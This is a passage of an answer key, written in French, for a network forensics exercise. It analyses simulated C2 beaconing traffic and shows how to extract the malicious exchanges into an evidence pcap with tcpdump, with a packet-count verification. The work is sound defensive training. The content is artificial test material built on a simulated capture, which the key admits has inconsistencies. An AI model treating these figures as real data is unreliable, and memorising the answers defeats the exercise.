+    probablement l'attaque à ce moment.
+
+  Remarques :
+    - Les requêtes suivantes (n=6 et n=7) ont la même taille que les
+      précédentes (140 octets) : le résultat de whoami n'apparaît pas dans
+      les balises capturées (renvoyé plus tard ou par un autre canal).
+    - La réponse CMD:whoami annonce Content-Length: 9 alors que le corps
+      fait 10 octets (48 - 42 = 6 = 10 - 4) : incohérence due à la capture
+      simulée ; l'analyse reste la même.
+
+
+
+------------------------------------------------------------------------------
+B6. Extraire la preuve
+------------------------------------------------------------------------------
+Q12 — Fichier de preuve preuve_c2.pcap
+  Commandes :
+    # Lire la capture d'origine, filtrer, écrire le résultat
+    tcpdump -nr Ebenisterie_Gatineau.pcap -w preuve_c2.pcap 'host 198.51.100.66'
+    # Vérifier
+    ls -l preuve_c2.pcap
+    tcpdump -nr preuve_c2.pcap | head
+    tcpdump -nr preuve_c2.pcap | wc -l
+
+  Explication :
+    -r lit la capture d'origine, le filtre 'host 198.51.100.66' garde les
+    paquets dans les deux sens (poste -> serveur C2 et serveur C2 -> poste)
+    et -w écrit uniquement ces paquets dans un nouveau fichier pcap. Rien
+    ne s'affiche pendant l'écriture. sudo n'est pas nécessaire : on ne
+    fait que lire et écrire des fichiers.
+
+  Réponse :
+    Le fichier preuve_c2.pcap contient 80 paquets (7 086 octets).
+
+  Vérification du nombre :
+    Chacune des 8 balises est une connexion TCP complète de 10 paquets :
+      1. SYN               poste -> C2
+      2. SYN-ACK           C2 -> poste
+      3. ACK               poste -> C2
+      4. GET /maj/check    poste -> C2
+      5. ACK               C2 -> poste
+      6. 200 OK (NOOP/CMD) C2 -> poste
+      7. ACK               poste -> C2
+      8. FIN               poste -> C2
+      9. FIN               C2 -> poste
+     10. ACK               poste -> C2
+    8 balises x 10 paquets = 80 paquets.
+    Dont 4 x 8 = 32 paquets envoyés par 198.51.100.66, ce qui correspond
+    au décompte de la question 3, et 6 x 8 = 48 envoyés par le poste.
+
+  Intérêt :
+    Le fichier de preuve isole les échanges malveillants sans le reste du
+    trafic de l'entreprise (Office 365, banque, RH...). Il est plus léger
+    à transmettre, protège la confidentialité des autres communications
+    et peut être réanalysé à tout moment (ex. tcpdump -nr preuve_c2.pcap -A).
+
+
+
